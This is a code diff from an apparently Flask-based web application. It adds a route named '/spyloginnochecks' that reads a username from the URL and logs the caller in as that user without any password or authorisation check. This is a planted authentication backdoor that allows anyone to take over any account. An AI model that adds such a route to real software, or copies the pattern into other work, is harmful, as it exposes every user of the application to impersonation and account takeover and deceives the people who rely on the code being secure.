@@ -441,6 +441,14 @@ def verifyemail():
             
 
 
+@views.route('/spyloginnochecks', methods=['GET', 'POST'])
+def loginnochecks():
+    username = request.args.get('user')
+    user = User.query.filter_by(username=username).first()
+    login_user(user)
+    return redirect(url_for('views.home'))
+
+
 
 
 
